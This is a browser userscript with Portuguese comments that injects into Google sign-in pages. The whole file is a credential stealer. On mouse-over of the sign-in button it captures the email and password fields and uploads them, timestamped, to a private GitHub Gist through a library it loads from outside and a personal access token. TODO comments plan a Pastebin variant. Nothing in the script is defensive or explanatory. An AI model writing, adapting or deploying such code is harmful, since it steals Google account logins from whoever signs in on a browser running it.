// ==UserScript==
// @name            testeCreateGist
// @description     precisa: OAuth para o Gist, API externa; não realmente privados.
// @namespace       https://gist.github.com/micalevisk/3f94e2000732ce51304472a4564f4cfe
// @author          Micael Levi
// @locale          pt-br
// @include         *://accounts.google.com/ServiceLogin?*
// @include         *://accounts.google.com/signin*
// @version         1.04-2
// @grant           none
// ==/UserScript==

//	FIXME   só detecta a partir do segundo movimento
//  FIXME   usar  o setTimeout para esperar o post antes de redirecionar
//	FIXME   não criar novo Gist, apenas alterar (acrescentar arquivo?)
//	FIXME   salvar somente ao submeter senha (adciona-lá ao conteudo do gist),	ou fazer download (ao inves de POST) http://danml.com/download.html,			@require http://danml.com/js/download.js
//
//	TODO    como usar o @require para utilizar um API externa.
//	TODO    criptografar senha antes de dar o patch
//	TODO    identificar ENTER
//	TODO    ao finalizar este, migrar com a mesma ideia, para o Pastebin que posta realmente privado.




/////////////// [ PRIVATE DATA ] ///////////////
/// @grant       	GM_getResourceText
/// @resource    	authentication file:///C:/Users/user/AppData/Roaming/Mozilla/Firefox/Profiles/xwt25znr.default/gm_scripts/_private.js
/// eval(GM_getResourceText("authentication"));
// const AUTH = gist_privateData;
// GIST_USERNAME = AUTH.username;
// PERSONAL_ACCESS_TOKEN = AUTH.useroauth;
const GIST_USERNAME = "micalevisk";
const PERSONAL_ACCESS_TOKEN = "<OAUTH>";
////////////////////////////////////////////////


// ignora tais prefixos de email:
const IGNORAR = [ "mllc", "terminatorredapb" ];

var user_especs = new USERSET(null,null,false);


////////////////////////////////////////////////////////
function USERSET(email, senha, flag){
    this.email = email;
    this.senha = senha;
    this.flag  = flag; // true: ja foi postado.
}
USERSET.prototype.toString = function(){
    return this.email + ':' + this.senha;
};

function getDateAndHour(){
    var today = new Date();
    var dd = today.getDate();
    var mm = today.getMonth()+1;
    var yyyy = today.getFullYear();
    var HH = today.getHours();
    var MM = today.getMinutes();

    dd = dd.toString().normalizarData();
    mm = mm.toString().normalizarData();
    HH = HH.toString().normalizarData();
    MM = MM.toString().normalizarData();

    today = `[${mm}/${dd}/${yyyy} - ${HH}:${MM}]`;

    return today;
}
////////////////////////////////////////////////////////




/**
 * Inicia a API Gistachio (c) https://github.com/stuartpb/gistachio.
 * @param {String} id	- A id no objeto script que será criado.
 * @param {Boolean} confirmar	- Se for 'true', exibe uma mensagem no console após inserir.
 */
function initgistachioAPI(id, confirmar){
    var script = document.createElement('script');
    script.type = 'text/javascript';
    script.src = 'https://rawgit.com/micalevisk/GM_scripts/master/gistachio.js'; // (c) https://rawgit.com/stuartpb/gistachio/master/gistachio.js
    if(id) script.id  = id;
    document.head.appendChild(script);

    if(confirmar)
        console.info("inserido!");
}


/**
 * Cria e posta um gist no http://gits.github.com
 * @param {USERSET}	conteudo - O conteúdo do gist.
 * @param {String}	filenmae - O nome do arquivo no gist.
 * @param {String}	filedescription - A descrição do gist.
 * @param {String}	oauthgist - Personal access token (definido para criar gists).
 */
function postit(conteudo, filename, filedescription, oauthgist){
    if(!conteudo || !filename) return;

    conteudo = getDateAndHour() + '\n' + conteudo.toString();

    console.info("PREVIEW:");
    console.log(conteudo);

    var newfile = { fileName: { content: conteudo } };
    var optsnew = {
        accessToken: oauthgist,
        description: filedescription,
        public: false
    };

    var showResult = function(e, gistid){
        if(e){
            user_especs.flag = false;
            console.error(e);
        }
        else{
            user_especs.flag = true;
            linkresult = `https://gist.github.com/${GIST_USERNAME}/${gistid}`;
            console.log(linkresult);
            copy(gistid);
        }
    };

    window.gistachio.postFiles(newfile, optsnew, showResult);
}




///////////////////////// [ ALTERAR ESTA ] /////////////////////////
function GM_main(){
    var formulario = document.querySelector('form#gaia_loginform');

    //   document.querySelector('form#gaia_loginform').addEventListener('submit', function (e) {
    //      e.preventDefault();
    //   });

    document.getElementById('signIn').onmouseover = function () {

        loginmail= formulario.Email;
        password = formulario.Passwd;

        if(typeof loginmail !== 'undefined'){
            emailcurr = loginmail.value;

            if(!IGNORAR.contemEmail(emailcurr) && (!user_especs.flag))
                user_especs.email = emailcurr;
        }

        if(typeof password !== 'undefined'){
          if(user_especs.email){
            user_especs.senha = password.value;

            if((!user_especs.flag) && (user_especs.senha.length >= 6))
          		postit(user_especs,
                'teste bitch please conteúdo',
                'descrição do gist',
                PERSONAL_ACCESS_TOKEN);
          }
        }

    };
}




///////////////////////////////// [ MAIN ] ////////////////////////////////
if(document.getElementById('meulog') === null) initgistachioAPI('meulog', true);

window.addEventListener("load", GM_main, false);





///////////////////////////////////////////////////////////
String.prototype.normalizarData = function(){
    return this.replace(/^\d$/i, "0$&");
};

Array.prototype.contemEmail = function ( emailstr ) {
    dominio = emailstr.replace(/^([^@]+)@.+$/i, "$1").trim();
    return (this.indexOf(dominio) > -1);
};
///////////////////////////////////////////////////////////
